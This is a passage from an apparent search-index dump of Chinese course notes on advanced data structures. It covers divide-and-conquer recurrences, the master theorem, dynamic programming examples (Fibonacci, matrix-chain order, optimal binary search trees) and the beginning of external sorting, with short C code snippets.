\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N)\\) :</p> \\[\\begin{array}l T(N) &amp; = 2T(N / 2)+cN \\\\ &amp; = 2[2T(N / 2^2)+ cN / 2] +cN\\\\ &amp; = 2^2 T(N / 2^2) +2cN\\\\ &amp; = ... \\\\ &amp; =2^kT(N / 2^k) +kcN\\\\ &amp; =N+cN\\log N = O(N\\log N) \\end{array}\\] <p>\u82e5 Combine \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N^2)\\)</p> \\[ \\begin{array}l T(N) &amp; = 2T(N / 2)+cN^2 \\\\ &amp; = 2[2T(N / 2^2)+ cN^2 / 2] +cN^2\\\\ &amp; = 2^2 T(N / 2^2) +\\frac{3}{2}cN^2\\\\ &amp; = ... \\\\ &amp; =2^kT(N / 2^k) +cN(1+\\frac{1}{2}+...+\\frac{1}{2^{k-1}})\\\\ &amp; =O(N^2) \\end{array} \\] <p>\u6240\u4ee5\uff0c\u6211\u4eec\u5fc5\u987b\u786e\u5b9a\u4e00\u4e2a\u7b97\u6cd5\uff0c\u4f7f\u5f97 Combine \u90e8\u5206\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N)\\)\uff0c\u624d\u80fd\u5c06\u6574\u4f53\u65f6\u95f4\u590d\u6742\u5ea6\u964d\u4f4e\u81f3 \\(O(N\\log N)\\)</p> <p>\u7531\u4e8e\u6211\u4eec\u5df2\u77e5\u5de6\u53f3\u4e24\u4fa7\u5e73\u9762\u70b9\u4e4b\u95f4\u7684\u6700\u5c0f\u503c\uff0c\u90a3\u4e48\u6574\u4e2a\u5e73\u9762\u7684\u8ddd\u79bb\u6700\u5c0f\u503c\u4e0d\u4f1a\u5927\u4e8e\u8fd9\u4e2a\u503c\u3002\u9009\u53d6\u5df2\u77e5\u6700\u5c0f\u503c\u5c0f\u7684\u90a3\u4e2a \\(\\delta\\) \u4f5c\u4e3a\u9608\u503c\uff0c\u5728\u5206\u5272\u7ebf\u5de6\u53f3\u4e24\u4fa7\u5212\u5206\u4e00\u4e2a\u8303\u56f4\uff0c\u4e14\u8d85\u51fa\u8fd9\u4e2a\u8303\u56f4\u7684\u70b9\u90fd\u4e0d\u4f1a\u5728\u8003\u8651\u8303\u56f4\u4e4b\u5185\uff1a</p> <p></p> <p>\u6309\u7167\u7edf\u8ba1\u7406\u8bba\uff0c\u8fd9\u4e24\u6761\u7ebf\u5185\u90e8\u7684\u70b9\u7684\u4e2a\u6570\u4e00\u822c\u5728 \\(\\sqrt{N}\\) \u5185\uff0c\u56e0\u6b64\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(\\sqrt{N}^2) = O(N)\\) \uff0c\u4f46\u4f5c\u4e3a\u8ba1\u7b97\u673a\u7b97\u6cd5\u4e0d\u80fd\u8fd9\u6837\u5206\u6790\u3002</p> <p>\u6ce8\u610f\u5230\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u5bf9 y \u5750\u6807\u8fdb\u884c\u8ddd\u79bb\u8fc7\u6ee4\uff0c\u8981\u6c42 \\(y_1 -y_2 \\lt \\delta\\) \uff0c\u6b64\u65f6\u8981\u6bd4\u8f83\u7684\u4e24\u70b9\u6709\u5982\u4e0b\u8981\u6c42\uff1a</p> <ul> <li>\\(\\Delta y \\lt \\delta\\)</li> <li>\\(\\Delta x \\lt \\delta\\)</li> <li>\u4e24\u70b9\u82e5\u5728\u540c\u4e00\u4fa7\uff0c\u5219\u8be5\u4e24\u70b9\u4e4b\u95f4\u8ddd\u79bb\u5927\u4e8e \\(\\delta\\)</li> </ul> <p>\u56e0\u6b64\uff0c\u6ee1\u8db3\u6761\u4ef6\u7684\u6700\u591a\u53ea\u6709 7 \u4e2a\u70b9\uff0c\u4e5f\u5c31\u662f\u8bf4\u8981\u6bd4\u8f83 7 \u6b21\uff08\u5e38\u6570\u6b21\uff09</p> <p>\u90a3\u4e48\uff0c\u5bf9\u4e8e\u641c\u7d22\u7684\u70b9\uff0c\u53ea\u9700\u8981\u6bd4\u8f83\u5e38\u6570\u6b21\u5c31\u53ef\u4ee5\u904d\u5386\u5230\u4e0b\u4e00\u4e2a\u70b9\u4e86\uff0c\u6bd4\u8f83\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N)\\)</p> <pre><code>for(i = 0;i &lt; NumPointsInStrip;i++)\n    for(j = i + 1;j &lt; NumPointsInStrip;j++)\n        if(Dist_y(P_i, P_j) &gt; Min_dist)\n            break;\n        else if(Dist(P_i, P_j) &lt; Min_dist)\n            Min_dist = Dist(P_i, P_j);  \n</code></pre> \u62d3\u5c55\u9605\u8bfb: \u6700\u5927\u5b50\u5e8f\u5217\u548c\u95ee\u9898 <p>\u5bf9\u4e8e\u4e00\u4e2a\u5b50\u5e8f\u5217\u533a\u95f4 \\([l,r]\\)\uff0c\u6211\u4eec\u7ef4\u62a4\u56db\u4e2a\u91cf\uff1a</p> <ul> <li><code>lSum</code> \u8868\u793a\u4ee5 l \u4e3a\u5de6\u7aef\u70b9\u7684\u6700\u5927\u5b50\u5e8f\u5217\u548c</li> <li><code>rSum</code> \u8868\u793a\u4ee5 r \u4e3a\u53f3\u7aef\u70b9\u7684\u6700\u5927\u5b50\u5e8f\u5217\u548c</li> <li><code>mSum</code> \u8868\u793a \\([l,r]\\) \u5185\u7684\u6700\u5927\u5b50\u5e8f\u5217\u548c</li> <li><code>iSum</code> \u8868\u793a \\([l,r]\\) \u7684\u533a\u95f4\u548c</li> </ul> <pre><code>struct Status {\n    int lSum, rSum, mSum, iSum;\n};\n\nstruct Status pushUp(struct Status l, struct Status r) {\n    int iSum = l.iSum + r.iSum;\n    int lSum = fmax(l.lSum, l.iSum + r.lSum);\n    int rSum = fmax(r.rSum, r.iSum + l.rSum);\n    int mSum = fmax(fmax(l.mSum, r.mSum), l.rSum + r.lSum);\n    return (struct Status){lSum, rSum, mSum, iSum};\n};\n\nstruct Status get(int* a, int l, int r) {\n    if (l == r) {\n        return (struct Status){a[l], a[l], a[l], a[l]};\n    }\n    int m = (l + r) / 2;\n    struct Status lSub = get(a, l, m);\n    struct Status rSub = get(a, m + 1, r);\n    return pushUp(lSub, rSub);\n}\n\nint maxSubArray(int* nums, int numsSize) {\n    return get(nums, 0, numsSize - 1).mSum;\n}\n</code></pre>"},{"location":"Courses/DS/ADS/Divide%20%26%20Conquer/#solution-method","title":"Solution Method","text":""},{"location":"Courses/DS/ADS/Divide%20%26%20Conquer/#mathematical-induction","title":"Mathematical\u00a0Induction","text":"<p>\u53ef\u4ee5\u901a\u8fc7\u731c\u4e00\u4e2a\u65f6\u95f4\u590d\u6742\u5ea6\uff0c\u7136\u540e\u901a\u8fc7\u6570\u5b66\u5f52\u7eb3\u6cd5\u8bc1\u660e\u5b83\u3002</p> <p>\u3010Example\u3011 \\(T(N)=2T(\\lfloor N / 2 \\rfloor)+N\\)</p> <p>Guess\uff1a \\(T(N)=O(N\\log N)\\)</p> <p>Proof\uff1a </p> \\[\\begin{array}l T(N) &amp; = 2T(\\lfloor N / 2 \\rfloor)+N\\\\ &amp; \\le 2c \\lfloor \\frac{N}{2}\\rfloor \\log \\lfloor \\frac{N}{2}\\rfloor +N \\\\ &amp; \\le cN(\\log N -\\log 2)+N \\\\ &amp; \\le cN\\log N, \\ \\ \\text{for c} \\ge 1 \\end{array}\\] <p>\u4f46\u662f\uff0c\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\u4e00\u5b9a\u8bb0\u4f4f\uff0c\u6700\u540e\u7684\u5e38\u6570\u4e0d\u80fd\u53d8\uff0c\u4e0d\u7136\u65f6\u95f4\u590d\u6742\u5ea6\u5c31\u4f1a\u5728\u4e0d\u77e5\u4e0d\u89c9\u4e2d\u589e\u52a0\uff0c\u4ee5\u4e0b\u662f\u9519\u8bef\u7684\u5206\u6790\uff1a</p> <p>Guess\uff1a \\(T(N)=O(N)\\)</p> \\[\\begin{array}l T(N) &amp; = 2T(\\lfloor N / 2 \\rfloor)+N \\\\ &amp; \\le 2c \\lfloor \\frac{N}{2}\\rfloor +N \\\\ &amp; \\le cN +N \\end{array} \\] <p>\u8fd9\u91cc\u5e38\u6570\u4ece \\(c\\) \u53d8\u6210 \\(c+1\\) \u4e86\uff0c\u4f46\u662f\u8fd9\u53ea\u662f\u6570\u5b66\u5f52\u7eb3\u6cd5\u7684\u4e00\u6b65\u3002\u6b64\u9898\u76ee\u5411\u4e0b\u8fed\u4ee3\u7684\u6b21\u6570\u4e3a \\(O(\\log N)\\) \u6b21\uff0c\u6bcf\u8fed\u4ee3\u4e00\u6b21\uff0c\u5e38\u6570\u5c31\u52a0\u4e00\uff0c\u6700\u7ec8\u590d\u6742\u5ea6\u8fd8\u662f\u4f1a\u53d8\u4e3a \\(O(N\\log N)\\)</p> <p>\u3010Example\u3011 \\(T(N) =\\sqrt{N} T(\\sqrt{N}) + N\\log \\sqrt{N}\\)</p> <p>Guess\uff1a \u4e3b\u5b9a\u7406\u4e0d\u9002\u7528\u4e8e\u8be5\u9898\uff0c\u5e76\u4e14\u8ba1\u7b97\u9012\u5f52\u5c42\u6570\u7684\u65b9\u6cd5\u8f83\u4e3a\u590d\u6742\u96be\u7406\u89e3\uff0c\u56e0\u6b64\u6211\u4eec\u91c7\u7528\u731c\u6d4b\u9a8c\u8bc1\u3002\u7531\u4e8e\u8fd9\u4e2a\u5b9e\u9645\u4e0a\u662f\u628a\u4e00\u4e2a MergeSort \u5206\u4e3a \\(\\sqrt{N}\\) \u4e2a\u6bb5\u5206\u522b sort \u518d\u5408\u5e76\uff0c\u56e0\u6b64\u6211\u4eec\u731c\u6d4b\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N\\log N)\\)</p> \\[\\begin{array}l T(N) &amp; = \\sqrt{N}T(\\sqrt{N}) + \\frac{1}{2}N\\log N \\\\ &amp; = \\sqrt{N} \\times \\sqrt{N} \\log \\sqrt{N} + \\frac{1}{2}N\\log N \\\\ &amp; = \\frac{1}{2}N \\log N + \\frac{1}{2}N \\log N  \\\\ &amp; = N\\log N \\end{array}\\] <p>\u975e\u5e38\u5b8c\u7f8e\u7684\u8bc1\u660e\uff01</p>"},{"location":"Courses/DS/ADS/Divide%20%26%20Conquer/#recursion-tree-method","title":"Recursion-tree method","text":"<p>\u611f\u89c9\u4e0d\u662f\u5f88\u91cd\u8981\uff1f\u603b\u4e4b\u5c42\u6570\u6309\u6700\u6df1\u7684\u90a3\u4e2a\u6765\u3002</p> <p>\u3010Example\u3011 \\(T(N)=2T(\\sqrt{N})+\\log N\\)</p> <p>Proof\uff1a \u4e00\u76f4\u9012\u5f52\u5230\u6700\u540e\u4e00\u5c42\uff0c\u6709\uff1a</p> \\[ T(N)=2^k T(N^{1 / 2^k})+(k+1)\\log N \\] <p>\u4ee4 \\(N^{1 / 2^k}=2\\) \uff0c\u53ef\u5f97 \\(k=\\log \\log N\\)\uff0c\u5219\uff1a</p> \\[ T(N)=O(\\log N+(k+1)\\log N) = O(\\log N\\log \\log N) \\] <p>\u3010Example\u3011 \\(T(N)=T(N^{1 / 3}) + T(N^{2 / 3}) + \\log N\\)</p> <p>Proof: \u9012\u5f52\u6700\u5927\u5c42\u6570\u4ecd\u7136\u662f \\(\\log \\log N\\) \u6570\u91cf\u7ea7\uff0c\u5e76\u4e14\u6bcf\u5c42\u90fd\u6709 \\(c\\log N\\) \uff0c\u90a3\u4e48\u5199\u9898\u7684\u65f6\u5019\u53ef\u4ee5\u7b80\u5355\u8ba4\u4e3a \\(T(N)= O(\\log N \\log \\log N)\\) \u3002</p> <ul> <li>\u8bbe \\(t(k)= T(2^k)= T(N)\\)\uff0c\u90a3\u4e48 \\(t(k) =t( k / 3) + t(2k / 3)+ k =O(k\\log k)\\)</li> <li>\u5c06 \\(k=\\log N\\) \u4ee3\u56de\u53bb\u5f97\u5230 \\(T(N)= t(k) =O(\\log N \\log \\log N)\\)</li> </ul> <p>\u3010Example\u3011 \\(T(N)= 3 T(\\sqrt{N}) + \\log N\\)</p> <p>Proof: \u4e0e\u7b2c\u4e00\u4f8b\u53c8\u6709\u6240\u4e0d\u540c\u4e86\uff0c\u8fd8\u662f\u4e00\u76f4\u9012\u5f52\u5230\u6700\u540e\u4e00\u5c42\uff0c\u6709\uff1a</p> \\[ T(N) = 3^k T(N^{1 / 2 ^k}) + \\left[ 1+ \\frac{3}{2} + (\\frac{3}{2})^2 ... + (\\frac{3}{2})^k \\right]\\log N \\] <p>\u5176\u4e2d \\(k = \\log_2 \\log N\\) \uff0c\u4ee3\u5165\uff1a</p> \\[\\begin{array}l T(N) &amp; = 3^{\\log_2 \\log N} \\cdot 1 + 2\\left[  (\\frac{3}{2})^{k+1} -1 \\right]\\log N \\\\  &amp; = (\\log N)^{\\log_23} + O\\left( \\left(\\frac{3}{2}\\right)^{\\log_2\\log N} \\cdot \\log N\\right) \\\\  &amp; = (\\log N)^{\\log_23} + O\\left((\\log N)^{\\log_2\\frac{3}{2}+1}\\right)\\\\  &amp; = (\\log N)^{\\log_23} + O((\\log N)^{\\log_23}) \\\\  &amp; = O((\\log N)^{\\log_23}) \\end{array}\\]"},{"location":"Courses/DS/ADS/Divide%20%26%20Conquer/#master-method","title":"Master method","text":"\\[\\begin{gather}T(N)=aT(\\frac{N }{b})+\\Theta(N^k \\log^pN),a\\ge 1,b\\gt 1 ,p\\ge 0 \\\\ T(N)=\\begin{cases}O(N^{\\log_ba})\\  , &amp;\\ if\\ \\log_ba\\gt k \\\\ O(N^k\\log ^{p+1}N)\\ , &amp;\\ if\\ \\log_ba=k \\\\  O(N^k \\log ^pN)\\ , &amp;\\ if\\ log_ba\\lt k \\end{cases} \\end{gather}\\] <p>\u4e3b\u5b9a\u7406\u603b\u5171\u6709\u5f88\u591a\u7248\u672c\uff0c\u4f46\u6211\u4e0d\u60f3\u7ec6\u5206\u5dee\u522b\u4e86\uff0c\u6240\u4ee5\u53ea\u8bb0\u8fd9\u4e2a\u3002</p>"},{"location":"Courses/DS/ADS/Dynamic%20Programming/","title":"Dynamic Programming","text":""},{"location":"Courses/DS/ADS/Dynamic%20Programming/#dynamic-programming","title":"Dynamic Programming","text":"<p> \u7ea6 1061 \u4e2a\u5b57  34 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <ul> <li>&lt;1&gt; \u7531\u4f18\u5316\u5b50\u95ee\u9898\u7ed3\u6784\u5bfb\u627e\u9012\u63a8\u5173\u7cfb</li> <li>&lt;2&gt; \u7531\u9012\u63a8\u5173\u7cfb\u6c42\u89e3\u95ee\u9898\uff0c\u4f46\u4e0d\u91c7\u7528\u9012\u5f52\u7ed3\u6784\uff0c\u800c\u662f\u81ea\u5e95\u5411\u4e0a<ul> <li>\u5faa\u73af\u8fc7\u7a0b\u4e2d\u5c06\u4e2d\u95f4\u503c\u5b58\u50a8\u4e0b\u6765\uff0c\u4e0b\u6b21\u9700\u8981\u7528\u5230\u65f6\u76f4\u63a5\u53d6\u503c\u5373\u53ef\uff0c\u4e0d\u7528\u518d\u8ba1\u7b97</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Dynamic%20Programming/#fibonacci","title":"\u7ecf\u5178\u6848\u4f8b\uff1aFibonacci","text":"<p>\u5e38\u89c4\u4f7f\u7528\u9012\u5f52\u89e3\u51b3\u6590\u6ce2\u90a3\u5951\u6570\u5217\u6c42\u548c:</p> <pre><code>int Fib(int n) {\n    if (N &lt;= 1)\n        return 1;\n    else\n        return Fib(n-1) + Fib(n-2);\n}\n</code></pre> <p>\u89c2\u5bdf\u65f6\u95f4\u590d\u6742\u5ea6\uff1a</p> \\[ T(N)\\ge T(N-1)+T(N-2)\\ \\Rightarrow T(N)\\ge F(N)\\] <p>\u5f88\u660e\u663e\u5448\u6307\u6570\u7ea7\u589e\u957f\u3002</p> <p>\u6211\u4eec\u753b\u51fa\u8be5\u7b97\u6cd5\u7684\u9012\u5f52\u6811\uff1a</p> <p></p> <p>\u80fd\u770b\u51fa\u95ee\u9898\u5728\u4e8e\u975e\u5e38\u591a\u91cd\u590d\u7684\u51fd\u6570\u8c03\u7528\u5197\u4f59\u3002\u4e3a\u4e86\u907f\u514d\u91cd\u590d\u8c03\u7528\u8ba1\u7b97\u5b50\u95ee\u9898\uff0c\u6211\u4eec\u5e94\u60f3\u5230\u5c06\u4e2d\u95f4\u8fc7\u7a0b\u7b54\u6848\u8bb0\u5f55\u4e0b\u6765\uff0c\u540e\u9762\u518d\u9700\u8981\u7528\u5230\u65f6\u8c03\u7528\u8bb0\u5f55\u4e0b\u6765\u7684\u6570\u503c\u5373\u53ef\uff1a</p> <pre><code>int Fib(int N) {\n    int i, Last, NextToLast, Answer;\n    if(N &lt;= 1) return 1;\n    Last = NextToLast = 1; // F(0) = F(1) = 1\n    for (i = 2;i &lt;= N;i++) {\n        Answer = Last + NextToLast; //F(i)=F(i-1)+F(i-2)\n        NextToLast = Last; //Updata F(i-2)\n        Last = Answer; //Updata F(i-1)\n    }return Answer;\n}\n</code></pre> <p>\u65f6\u95f4\u590d\u6742\u5ea6\u4ece\u6307\u6570\u7ea7\u964d\u5230 \\(O(N)\\) \uff01</p>"},{"location":"Courses/DS/ADS/Dynamic%20Programming/#_1","title":"\u7ecf\u5178\u6848\u4f8b\uff1a\u77e9\u9635\u76f8\u4e58","text":"<p>\u5bf9\u4e8e\u4e24\u4e2a\u77e9\u9635 \\(A_{n\\times p}\\times B_{p\\times r}\\) \uff0c\u9700\u8981\u7684\u8ba1\u7b97\u6b21\u6570\u4e3a \\(T=n\\times p\\times r\\) \u3002</p> <p>\u5047\u5b9a\u6211\u4eec\u8981\u5bf9\u5982\u4e0b\u56db\u4e2a\u77e9\u9635\u8fdb\u884c\u77e9\u9635\u4e58\u6cd5\uff1a</p> \\[ M_{1[10\\times 20]} * M_{2[20\\times 50]} * M_{3[50\\times 1]} * M_{4[1\\times 100]} \\] <p>In order 1:</p> \\[ M_{1[10\\times 20]} * (M_{2[20\\times 50]} * (M_{3[50\\times 1]} * M_{4[1\\times 100]})) \\] <p>\u8ba1\u7b97\u65f6\u95f4\u4e3a\uff1a</p> \\[ 50\\times 1\\times 100+ 20\\times 50\\times 100+10 \\times 20\\times 100 = 125,000 \\] <p>In order 2:</p> \\[ (M_{1[10\\times 20]}* (M_{2[20\\times 50]} * M_{3[50\\times 1]})) * M_{4[1\\times 100]} \\] <p>\u8ba1\u7b97\u65f6\u95f4\u4e3a\uff1a</p> \\[ 20\\times 50\\times 1+10\\times 20\\times 1 + 10\\times 1\\times 100 = 2,200 \\] <p>\u53ef\u4ee5\u770b\u5230\u4e24\u79cd\u987a\u5e8f\u8ba1\u7b97\u65f6\u95f4\u5dee\u8ddd\u5de8\u5927\uff0c\u800c\u6211\u4eec\u9700\u8981\u627e\u51fa\u8ba1\u7b97\u65f6\u95f4\u82b1\u8d39\u6700\u5c0f\u7684\u987a\u5e8f\u3002</p> <p>\u4ee4 \\(b_n\\) \u4e3a\u8ba1\u7b97 \\(M_1\\cdot M_2\\cdot ...\\cdot M_n\\) \u7684\u603b\u987a\u5e8f\u4e2a\u6570\uff0c\u90a3\u4e48\u5176\u521d\u503c\u4e3a\uff1a</p> \\[ b_2 = 1, b_3 = 2, b_4 = 5 ... \\] <p>\u5047\u5b9a \\(M_{ij}= M_i\\cdot M_{i+1}\\cdot ...\\cdot M_j\\)\uff0c\u90a3\u4e48 \\(M_{1n}=M_1 \\cdot ...\\cdot M_n= M_{1i}\\cdot M_{i+1\\ n}\\) </p> \\[ b_n =\\sum ^{n-1}_{i=1}b_i b_{i-1} \\ \\Rightarrow \\ b_n =O(\\frac{4^n}{n\\sqrt{n}}) \\] <p>\u4e3a\u6307\u6570\u7ea7\u590d\u6742\u5ea6\uff0c\u56e0\u6b64\u66b4\u529b\u6c42\u89e3\u4e0d\u53ef\u53d6\u3002</p> <p>DP \u7684\u5173\u952e\u5728\u4e8e\u4f18\u5316\u5b50\u7ed3\u6784\u4ee5\u53ca\u8bb0\u5f55\u91cd\u590d\u503c</p> <p>\u4e3a\u4e86\u8fbe\u5230\u4f18\u5316\u5b50\u7ed3\u6784\uff0c\u6211\u4eec\u8981\u6c42\u5b50\u95ee\u9898 \\(M_{1i}\\) \u548c \\(M_{i+1\\ n}\\) \u7684\u8ba1\u7b97\u90fd\u662f\u6700\u4f18\u89e3\uff0c\u5426\u5219\u603b\u7b54\u6848\u4e0d\u53ef\u80fd\u4e3a\u6700\u4f18\u89e3\u3002</p> \\[ m_{ij} = \\left \\{ \\begin{array}l  0 ,&amp; \\text{if }\\ i=j \\\\ \\min_{i\\le l\\lt j}\\{ m_{il} + m_{l+1\\ j} + r_{i-1} r_l r_j\\}, &amp; \\text{if }\\ i\\lt j \\end{array} \\right . \\] <p>\u56e0\u6b64\u6211\u4eec\u9700\u8981\u628a\u957f\u5ea6\u4e3a \\(1,2,3,...,n-1\\) \u7684\u5b50\u95ee\u9898\u90fd\u89e3\u51b3\uff0c\u7136\u540e\u5c06\u9700\u8981\u91cd\u590d\u5229\u7528\u7684\u503c\u8bb0\u5f55\uff0c\u5373\u53ef\u964d\u4f4e\u590d\u6742\u5ea6\u89e3\u51b3\uff1a</p> <pre><code>/* r contains number of columns for each of the N matrices */ \n/* r[ 0 ] is the number of rows in matrix 1 */ \n/* Minimum number of multiplications is left in M[ 1 ][ N ] */ \nvoid OptMatrix( const long r[ ], int N, TwoDimArray M ) \n{   int  i, j, k, L; \n    long  ThisM;\n    for(i = 1;i &lt;= N;i++)   M[ i ][ i ] = 0; // Initialize\n    for(k = 1;k &lt; N;k++) // k = j - i \u5b50\u95ee\u9898\u7684\u957f\u5ea6\n        for(i = 1;i &lt;= N - k;i++) { // For each position \n            j = i + k;\n            M[i][j] = Infinity; \n            for(L = i;L &lt; j;L++) { \n                ThisM = M[i][L] + M[L+1][j] + r[i-1] * r[L] * r[j]; \n                if (ThisM &lt; M[i][j])  // Update min \n                    M[i][j] = ThisM; \n            }  // end for-L\n        }  // end for-Left\n}\n</code></pre> <p>\u6700\u5916\u5c42\u5faa\u73af\u4e00\u5b9a\u662f\u5b50\u95ee\u9898\u957f\u5ea6</p> <p>\u5f97\u5230\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(T(N)=O(N^3)\\)</p>"},{"location":"Courses/DS/ADS/Dynamic%20Programming/#_2","title":"\u7ecf\u5178\u6848\u4f8b\uff1a\u6700\u4f18\u4e8c\u53c9\u641c\u7d22\u6811","text":"<p>\u6709 \\(N\\) \u4e2a\u5173\u952e\u5b57 \\(w_1 \\lt w_2\\lt ... \\lt w_N\\) \uff0c\u6bcf\u4e2a\u5173\u952e\u5b57\u88ab\u68c0\u7d22\u7684\u6982\u7387\u4e3a \\(p_i\\) \uff0c\u79bb\u6811\u6839\u8d8a\u8fd1\uff0c\u68c0\u7d22\u65f6\u95f4\u8d8a\u5c11\uff0c\u90a3\u4e48\u5bf9\u8be5\u4e8c\u53c9\u641c\u7d22\u6811\u68c0\u7d22\u7684\u5e73\u5747\u65f6\u95f4\u4e3a\uff1a</p> \\[ T(N)=\\sum _{i=1}^N p_i(1+ d_i) \\] <p>\u7ed9\u5b9a\u4e0b\u5217\u68c0\u7d22\u8868\uff1a</p> word break case char do return switch void probability 0.22 0.18 0.20 0.05 0.25 0.02 0.08 \\[\\begin{array}l T_{ij} ::=OBST\\ for \\ w_i, ..., w_j \\\\ c_{ij}::= cost\\ of\\ T_{ij} \\\\ r_{ij}::=root\\ of\\ T_{ij} \\\\ w_{ij}::=weight\\ of\\ T_{ij}=\\sum_{k=i}^j p_k \\end{array} \\] <p></p> \\[\\begin{array}l c_{ij} &amp;=p_k +cost(L)+cost(R)+weight(L)+weight(R) \\\\ &amp; = p_k +c_{i, k-1} +c_{k+1, j} +w_{i,k-1} +w_{k+1,j} \\\\ &amp; = w_{ij} + c_{i,k-1} +c_{k+1, j} \\end{array}\\] <p>\u6240\u4ee5\u8981\u4f7f \\(T_{ij}\\) \u4e3a\u6700\u4f18\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\\(c_{ij}\\) \u8981\u53d6 \\(\\min_{i\\le l\\lt j}\\{ w_{ij} + c_{i,k-1} +c_{k+1, j}\\}\\)</p> <p>\u6240\u4ee5\u6211\u4eec\u4ece\u5355\u4e2a\u8282\u70b9\u7684\u6700\u4f18\u4e8c\u53c9\u641c\u7d22\u6811\u5f00\u59cb\u9010\u4e2a\u5411\u4e0a\u642d\u5efa\uff0c\u5176\u4e2d \\(w_{ij}\\) \u56fa\u5b9a\u5df2\u77e5\uff0c\u4e3a \\(i-j\\) \u8303\u56f4\u5185\u6240\u6709\u8282\u70b9\u7684\u6982\u7387\u548c\uff0c\u6211\u4eec\u53ea\u9700\u8981\u53d6\u5230\u6700\u5c0f\u7684 \\(c_{i,k-1} +c_{k+1,j}\\) \u5373\u53ef\uff1a</p> <p></p> <p>\u683c\u5b50\u7ed3\u6784</p> <p>\u4ee5\u7b2c\u4e09\u6392\u7b2c\u4e00\u4e2a\u683c\u5b50\u4e3a\u4f8b\uff0c<code>break..char</code> \u8868\u793a\u4ee5 <code>break</code>,<code>case</code>,<code>char</code> \u4e3a\u8282\u70b9\u6784\u9020\u7684\u6700\u4f18\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\\(1.02\\) \u8868\u793a\u8be5\u6700\u4f18\u4e8c\u53c9\u641c\u7d22\u6811\u7684 \\(cost\\) (\\(0.22*2+0.18+0.20*2\\))\uff0c<code>case</code> \u8868\u793a\u8be5\u6700\u4f18\u4e8c\u53c9\u641c\u7d22\u6811\u4ee5\u8282\u70b9 <code>case</code> \u4e3a\u6839\u3002</p> <p>\u6700\u7ec8\u53ef\u4ee5\u5f97\u5230 <code>break..void</code> \u7684 \\(cost\\) \u4e3a \\(2.15\\) \uff0c\u5176\u4ee5 <code>char</code> \u4e3a\u6839\u8282\u70b9\uff1b\u636e\u6b64\uff0c\u8fd8\u53ef\u4ee5\u8fdb\u884c\u56de\u6eaf\uff0c\u5c06\u8be5\u4e8c\u53c9\u641c\u7d22\u6811\u6784\u5efa\u51fa\u6765\u3002</p> <p>\u5c11\u4e2aProduct Assembly\u95ee\u9898\uff0c\u6211\u6446\u4e86</p>"},{"location":"Courses/DS/ADS/External%20Sort/","title":"External Sort","text":""},{"location":"Courses/DS/ADS/External%20Sort/#_1","title":"\u5916\u90e8\u6392\u5e8f","text":"<p> \u7ea6 1305 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>\u786c\u4ef6\u80cc\u666f</p> <p>\u4e00\u822c\u6765\u8bb2\uff0c\u666e\u901a\u7684\u6392\u5e8f\u7b97\u6cd5\u90fd\u662f\u5bf9\u5185\u5b58\u4e2d\u7684\u6570\u7ec4\u8fdb\u884c\u64cd\u4f5c\u3002\u7136\u800c\u6709\u4e9b\u65f6\u5019\u8981\u88ab\u6392\u5e8f\u7684\u6570\u7ec4\u65e0\u6cd5\u5b8c\u6574\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\uff0c\u53ef\u80fd\u4f1a\u5b58\u653e\u4e8e\u786c\u76d8\u4e4b\u7c7b\u7684I/O\u8bbe\u5907\u4e2d\uff0c\u4f46\u662f\u8bbf\u95ee\u8fd9\u4e9b\u8bbe\u5907\u7684\u5f00\u9500\u662f\u975e\u5e38\u5927\u7684\uff0c\u5e76\u4e14\u6211\u4eec\u53ea\u80fd\u4ece\u4e2d\u4e00\u5757\u4e00\u5757\u53d6\u51fa\u6570\u636e\u3002\u6211\u4eec\u80fd\u505a\u7684\u662f\u6bcf\u6b21\u5c06\u8fd9\u6bb5\u5c0f\u5757\u6570\u636e\u6392\u6210\u6709\u5e8f\u7684\uff0c\u6700\u540e\u518d\u5c06\u5404\u4e2a\u6709\u5e8f\u7684\u5c0f\u6bb5 Merge \u6210\u6709\u5e8f\u7684\u957f\u6bb5\u3002</p> <p>\u4e3a\u4e86\u7b80\u5316\u95ee\u9898\uff0c\u672c\u7ae0\u5185\u5bb9\u8ba4\u4e3a:</p> <ul> <li>\u6570\u636e\u5b58\u50a8\u5728\u53ea\u80fd\u987a\u5e8f\u8bbf\u95ee\u7684 Tape \u4e0a</li> <li>\u6700\u5c11\u6709 3 \u4e2a Tape \u53ef\u4f9b\u4f7f\u7528</li> </ul>"},{"location":"Courses/DS/ADS/External%20Sort/#a-simple-example","title":"A Simple Example","text":"<p>\u5047\u5b9a\u5185\u90e8\u5185\u5b58\u4e00\u6b21\u53ef\u4ee5\u4ece Tape \u4e2d\u8bfb\u53d6 \\(M=3\\) \u4e2a Records(\u5373\u5185\u5b58\u53ea\u6709 3 records \u5927\u5c0f)\uff0c\u90a3\u4e48\u6211\u4eec\u5904\u7406\u5982\u4e0b\u5b58\u50a8\u5728 \\(T_1\\) \u4e2d\u7684 \\(N=13\\) \u4e2a\u6570\u636e\u7684\u6b65\u9aa4\uff1a</p> <p></p> <p>\u7531\u4e8e\u78c1\u5e26\u53ea\u80fd\u987a\u5e8f\u8bfb\u53d6\uff0c\u6240\u4ee5\u5728\u7b2c\u4e8c\u6b21 Pass \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c06 \\(T_2\\) \u7684\u524d\u4e09\u4e2a\u6570\u636e\u548c \\(T_3\\) \u7684\u524d\u4e09\u4e2a\u6570\u636e\u8fdb\u884c Merge\uff0c\u5e76\u5b58\u50a8\u5230\u7a7a\u95f2\u7684 \\(T_1\\) \u78c1\u5e26\u4e2d\u3002</p> 